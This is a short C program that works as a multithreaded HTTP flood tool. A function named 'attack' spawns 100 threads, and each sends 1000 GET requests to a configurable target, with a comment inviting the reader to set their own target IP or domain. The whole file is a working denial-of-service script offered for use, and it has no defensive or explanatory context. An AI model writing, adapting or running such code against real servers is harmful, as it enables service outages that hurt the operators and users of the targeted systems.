#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define TARGET "127.0.0.1"   // Change to your target IP or domain
#define PORT 80
#define NUM_THREADS 100
#define NUM_REQUESTS 1000

void *attack(void *arg) {
    struct sockaddr_in server_addr;
    int sock;
    char request[] = "GET / HTTP/1.1\r\nHost: " TARGET "\r\nConnection: close\r\n\r\n";

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = inet_addr(TARGET);

    for (int i = 0; i < NUM_REQUESTS; i++) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("socket");
            continue;
        }

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("connect");
            close(sock);
            continue;
        }

        ssize_t sent = send(sock, request, strlen(request), 0);
        if (sent < 0) {
            perror("send");
        } else {
            printf("[+] Request sent (%ld bytes)\n", sent);
        }

        close(sock);
    }

    return NULL;
}

int main() {
    pthread_t threads[NUM_THREADS];

    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, attack, NULL) != 0) {
            perror("pthread_create");
        }
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
